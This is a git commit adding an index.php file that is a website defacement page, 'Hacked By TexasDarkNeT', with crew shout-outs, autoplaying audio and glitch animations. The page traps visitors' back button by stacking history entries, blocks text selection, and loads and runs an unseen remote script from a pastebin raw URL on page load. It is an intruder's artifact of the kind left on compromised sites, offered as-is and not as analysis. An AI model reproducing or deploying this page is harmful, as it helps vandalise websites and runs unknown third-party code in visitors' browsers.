8b8df7f4eed0998435fc1f6c32edcc315f451f86
markocop123 <75019835+markocop123@users.noreply.github.com>
2020-11-25 18:26:32 +0700

    index.php
    index.php

---
+++ index.php
@@ -0,0 +1,94 @@
+
+<html>
+<head>
+
+<script>
+	>l
+(function () {
+for(var i = 0; i < 20; i++) {
+history.pushState(null, document.title, window.location.href );
+}
+})(document, window, history);
+</script>
+
+<link rel="icon" type="image/png" href="https://h.top4top.io/p_1750mwaaj0.jpg" type="image/x-icon"/>
+<title>Hacked By TexasDarkNeT</title>
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"> 
+<meta name="theme-color" content="black">
+<meta http-equiv="Content-Type" content="text/html; charset=Windows-1254"/>
+
+</span>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<script type="text/javascript" src="https://pastebin.com/raw/ynL2hpMe"></script>
+</head>
+<style type="text/css">
+@import url("//fonts.googleapis.com/css?family=Iceland|Shadows+Into+Light&display=swap");
+body{
+  	 overflow:hidden;
+  	 display: flex;
+  	 align-items: center;
+  	 justify-content: center;
+  	 margin:0;
+  	 padding:0;
+  	 width:100%;
+  	 background-color:#000;
+  	 }
+i{
+margin:10px;
+}
+a:link{
+color:#000;
+}
+h1{
+	color: #000;
+	text-decoration: none;
+	border-radius:0px;
+	border:0px;
+	font-family: 'Shadows Into Light', cursive;
+	font-size:50px;
+	margin:0px;
+	padding:0px;
+	animation:lamerkaratan 0.1s linear infinite;
+}
+pre{
+color:white;
+}
+marquee{
+width:100%;
+}
+@keyframes lamerkaratan{
+2%{color:#fff;}
+3%{transform:translate(2px,-10px) skewX(3240deg);}
+5%{transform:translate(0px,0px) skewX(0deg);}
+2% , 54%{transform:translateX(0px) skew(0deg);}
+55%{transform:translate(-2px,6px) skew(-5530deg);}
+56%{transform:translate(0px,0px) skew(0deg);}
+57%{transform:translate(4px,-10px) skew(-70deg);}
+58%{transform:translate(0px,0px) skew(0deg);}
+62%{transform:translate(0px,20px) skew(0deg);}
+63%{transform:translate(4px,-2px) skew(0deg);}
+90%{transform:translate(1px,3px); skew(-230deg);}
+95%{transform:translate(-7px,2px); skew(-120deg);}
+100%{transform:translate(0px,0px) skew(0deg);}
+</style>
+<body scroll="no" style="overflow: hidden" ondragstart="window.event.returnValue=false" onselectstart="event.returnValue=false">
+<embed src="http://baliforyou.com/zxmbxe_.mp3" type="audio/mpeg" autostart="true" loop="true" height="0" width="0">
+<center>
+<img title="Pixy-Sec" class="picture" src="https://h.top4top.io/p_1750mwaaj0.jpg"/>
+<br><h1><font color="red">Hacked By</font> TexasDarkNeT</font></h1><br>
+	<h1>Tidak Perlu Menjadi Jagoan Untuk Di Takuti , Cukup Menghargai Jika Ingin Dihargai"<h1>
+		<h1>~TexasDarkNeT Was Here~</h1>
+		 <br><font face="Courier New" size="7" color="white">PlayMusik</font><br>
+      <br> <style type="text/css"> .lagu{ background:transparent; border:3px solid white; text-shadow:0px 0px 5px blue; border-radius:13px; font-family:Share Tech Mono; color:blue; font-size:18x; font-weight:bold; padding:3px 29px; text-decoration:none; text-shadow:0px 0px 20px red; } </style> 
+<audio id="lagu" src="https://c.top4top.io/m_17525xu3g0.mp3"></audio> 
+</audio>
+<button class="lagu" onclick="play();liat();"><font face="Orbitron" size="3" color="White">Play</font></button> <button class="lagu" onclick="pause(); liat();"><font face="Orbitron" size="3" color="white">Pause</font></button> <audio id="lagu" src="https://c.top4top.io/m_17525xu3g0.mp3"></audio> </audio> <script> function play(){ var audio = document.getElementById('lagu'); audio.play(); } function liat(){ document.getElementById('galiat').style.visibility='visible'; } function pause(){ var audio = document.getElementById('lagu'); audio.pause(); } function liat(){ document.getElementById('galiat').style.visibility='visible'; } </script> 
+</script>
+
+<marquee direction="scroll"><pre><font color="red">My Friends</font> TexasDarkNeT - ITSMEIKY - Thunder - Dzxly - King Hussein - Gazel - Czxp - XShimarru - Kuramakun - Derizxy - Javas - XBEE - Febrigz - MrF - Astar - JackDavis - BoyDarkNeT - Shammer - TnBucin - TnDinas - Revoer - XNzul - KingMoon - Maszal - F3RGUSO - Tn.Benjamin - Mr Kijang</pre></marquee><br>
+<pre id="Clock" style="font-size:38px;font-family:iceland;color:#ff0000;margin:0;"></pre>
+      </center></td> 
+	<audio src="URL">
+</center>
+</body>
+</html>
